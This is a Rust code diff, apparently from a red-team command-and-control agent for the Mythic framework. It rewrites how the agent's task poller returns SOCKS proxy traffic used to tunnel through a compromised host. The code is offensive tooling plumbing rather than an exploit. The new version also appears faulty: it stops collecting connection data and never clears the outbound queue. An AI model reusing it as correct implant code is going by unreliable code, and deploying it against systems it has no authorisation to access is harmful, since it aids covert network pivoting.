@@ -238,51 +238,27 @@ impl Tasker {
     pub fn get_completed_tasks(&mut self) -> Result<Vec<serde_json::Value>, Box<dyn Error>> {
         let mut completed_tasks: Vec<serde_json::Value> = Vec::new();
     
-        // Existing background task logic...
+        // Existing background tasks...
         for task in self.background_tasks.iter() {
-            while let Ok(msg) = task.rx.try_recv() {
-                completed_tasks.push(msg);
-            }
+            while let Ok(msg) = task.rx.try_recv() { completed_tasks.push(msg); }
             if !task.running.load(Ordering::SeqCst) || Arc::strong_count(&task.running) == 1 {
-                while let Ok(msg) = task.rx.try_recv() {
-                    completed_tasks.push(msg);
-                }
+                while let Ok(msg) = task.rx.try_recv() { completed_tasks.push(msg); }
                 task.running.store(false, Ordering::SeqCst);
                 self.cached_ids.push_back(task.id);
             }
         }
         self.background_tasks.retain(|x| x.running.load(Ordering::SeqCst));
     
-        // ADD: SOCKS outbound messages
-        if let Some(socks_state) = &self.socks_state {
-            let mut outbound = socks_state.outbound.lock().unwrap();
-            let mut conns = socks_state.connections.lock().unwrap();
-            
-            // Collect data from connection readers
-            for (id, (_, rx)) in conns.iter_mut() {
-                while let Ok(data) = rx.try_recv() {
-                    if data.is_empty() {
-                        outbound.push(SocksMsg { exit: true, server_id: *id, data: String::new() });
-                        conns.remove(id);
-                    } else {
-                        outbound.push(SocksMsg {
-                            exit: false,
-                            server_id: *id,
-                            data: general_purpose::STANDARD.encode(&data),
-                        });
-                    }
-                }
-            }
-            
+        // SOCKS: Just forward outbound
+        if let Some(state) = &self.socks_state {
+            let outbound = state.outbound.lock().unwrap();
             if !outbound.is_empty() {
-                let socks_json = serde_json::to_value(outbound.clone()).unwrap();
-                completed_tasks.push(json!({
+                completed_tasks.push(serde_json::json!({
                     "user_output": "socks_data",
                     "completed": true,
                     "task_id": "socks_outbound",
-                    "socks": socks_json  // Mythic expects "socks" array in responses
+                    "socks": outbound
                 }));
-                outbound.clear();
             }
         }
     
